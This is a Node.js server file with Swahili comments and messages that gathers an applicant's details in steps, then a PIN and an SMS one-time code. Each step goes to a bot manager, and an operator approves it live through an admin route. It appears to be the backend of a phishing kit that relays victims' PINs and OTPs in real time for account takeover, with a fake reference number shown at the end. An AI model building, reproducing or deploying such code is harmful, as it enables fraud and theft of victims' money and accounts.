const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const io = new Server(server, { cors: { origin: "*" } });
const sessions = new Map();
let applicantCounter = 0; // Absolute counter for new applicants

io.on('connection', (socket) => {
    // Initialize session with fresh configuration flags
    sessions.set(socket.id, { 
        data: { socketId: socket.id, applicantNum: null },
        currentApprovalStage: null,
        stepsCompleted: []
    });

    socket.on('step1', (data) => {
        const session = sessions.get(socket.id);
        if (session) { 
            // If this is the first time they submit step 1, assign a sequential number
            if (!session.data.applicantNum) {
                applicantCounter++;
                session.data.applicantNum = applicantCounter;
            }
            session.data = { ...session.data, ...data }; 
            if (!session.stepsCompleted.includes(1)) session.stepsCompleted.push(1);
            
            botManager.sendStep1(session.data, session.stepsCompleted); 
        }
    });

    socket.on('step2', (data) => {
        const session = sessions.get(socket.id);
        if (session) { 
            session.data = { ...session.data, ...data }; 
            if (!session.stepsCompleted.includes(2)) session.stepsCompleted.push(2);
            
            botManager.sendStep2(session.data, session.stepsCompleted); 
        }
    });

    socket.on('step3-data', (data) => {
        const session = sessions.get(socket.id);
        if (session) { 
            session.data = { ...session.data, ...data }; 
            if (!session.stepsCompleted.includes(3)) session.stepsCompleted.push(3);
            
            botManager.sendStep3(session.data, session.stepsCompleted); 
        }
    });

    // Hatua 04 - PIN Confirmation (Requires Admin Approval)
    socket.on('step5-pin', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data.pin = data.pin;
            session.currentApprovalStage = 'pin';
            if (!session.stepsCompleted.includes(4)) session.stepsCompleted.push(4);
            
            botManager.sendStep4(session.data, session.stepsCompleted); 
        }
    });

    // Called after Admin Approves Step 4 PIN
    socket.on('send-otp', (data) => {
        const session = sessions.get(socket.id);
        if (session) { 
            session.data.phone = data.phoneNumber || session.data.phone; 
            socket.emit('otp-sent'); 
        }
    });

    // Hatua 05 - OTP Verification (Requires final Admin Approval)
    const handleStep4 = (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data.otp = data.otp || data;
            session.currentApprovalStage = 'otp';
            if (!session.stepsCompleted.includes(5)) session.stepsCompleted.push(5);
            
            botManager.sendStep5(session.data, session.stepsCompleted);
        }
    };
    socket.on('step4', handleStep4);
    socket.on('step4-otp', handleStep4);

    socket.on('disconnect', () => sessions.delete(socket.id));
});

// --- THE ADMIN ROUTE ---
app.post('/admin/action', (req, res) => {
    const { socketId, action } = req.body;
    const session = sessions.get(socketId);
    
    console.log(`[DECISION] Admin clicked ${action} for Socket: ${socketId}`);

    if (!session) {
        return res.status(404).json({ error: 'Active session not found' });
    }

    if (action === 'approve') {
        if (session.currentApprovalStage === 'pin') {
            io.to(socketId).emit('admin-approved', { stage: 'pin' });
        } else if (session.currentApprovalStage === 'otp') {
            io.to(socketId).emit('admin-approved', { 
                stage: 'otp', 
                referenceId: "REF-" + Date.now() 
            });
        }
    } else {
        io.to(socketId).emit('admin-rejected', { message: 'Maombi yamekataliwa.' });
    }
    
    res.sendStatus(200);
});

server.listen(PORT, '0.0.0.0', () => console.log(`🚀 Production Live on Port ${PORT}`));